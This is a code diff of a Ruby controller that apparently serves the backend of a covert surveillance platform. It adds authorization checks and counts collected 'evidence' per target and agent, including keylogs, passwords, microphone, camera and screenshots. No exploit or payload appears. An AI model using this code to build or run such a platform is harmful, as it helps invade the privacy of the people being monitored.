@@ -225,6 +225,8 @@ class EvidenceController < RESTController
   end
 
   def index_amf
+    require_auth_level :view
+
     mongoid_query do
 
       filter, filter_hash, target_id = ::Evidence.common_mongo_filter @params
@@ -301,40 +303,63 @@ class EvidenceController < RESTController
   end
 
   def total
-    # filtering
-    filter = {}
-    filter = JSON.parse(@params['filter']) if @params.has_key? 'filter'
+    require_auth_level :view
 
-    # filter by target
-    target = Item.where({_id: filter['target']}).first
-    return not_found("Target not found") if target.nil?
+    mongoid_query do
 
-    condition = {}
+      # filtering
+      filter = {}
+      filter = JSON.parse(@params['filter']) if @params.has_key? 'filter'
 
-    # filter by agent
-    if filter['agent']
-      agent = Item.where({_id: filter['agent']}).first
-      return not_found("Agent not found") if agent.nil?
-      condition[:aid] = filter['agent']
+      # filter by target
+      target = Item.where({_id: filter['target']}).first
+      return not_found("Target not found") if target.nil?
+
+      condition = {}
+
+      # filter by agent
+      if filter['agent']
+        agent = Item.where({_id: filter['agent']}).first
+        return not_found("Agent not found") if agent.nil?
+        condition[:aid] = filter['agent']
+      end
+
+      types = ["addressbook", "application", "calendar", "call", "camera", "chat", "clipboard", "device",
+               "file", "keylog", "position", "message", "mic", "mouse", "password", "print", "screenshot", "url"]
+
+      stats = []
+      types.each do |type|
+        query = {type: type}.merge(condition)
+        stats << {type: type, count: Evidence.collection_class(target[:_id]).where(query).count}
+      end
+
+      total = stats.collect {|b| b[:count]}.inject(:+)
+      stats << {type: "total", count: total}
+
+      return ok(stats)
     end
-
-    types = ["addressbook", "application", "calendar", "call", "camera", "chat", "clipboard", "device",
-             "file", "keylog", "position", "message", "mic", "mouse", "password", "print", "screenshot", "url"]
-
-    stats = []
-    types.each do |type|
-      query = {type: type}.merge(condition)
-      stats << {type: type, count: Evidence.collection_class(target[:_id]).where(query).count}
-    end
-
-    total = stats.collect {|b| b[:count]}.inject(:+)
-    stats << {type: "total", count: total}
-    
-    return ok(stats)
   end
 
   def filesystem
+    require_auth_level :view
 
+    mongoid_query do
+
+      # filter by target
+      target = Item.where({_id: @params['target']}).first
+      return not_found("Target not found") if target.nil?
+
+      condition = {}
+
+      # filter by agent
+      if @params.has_key? 'agent'
+        agent = Item.where({_id: @params['agent']}).first
+        return not_found("Agent not found") if agent.nil?
+        condition[:aid] = @params['agent']
+      end
+
+      return ok()
+    end
   end
 
 end
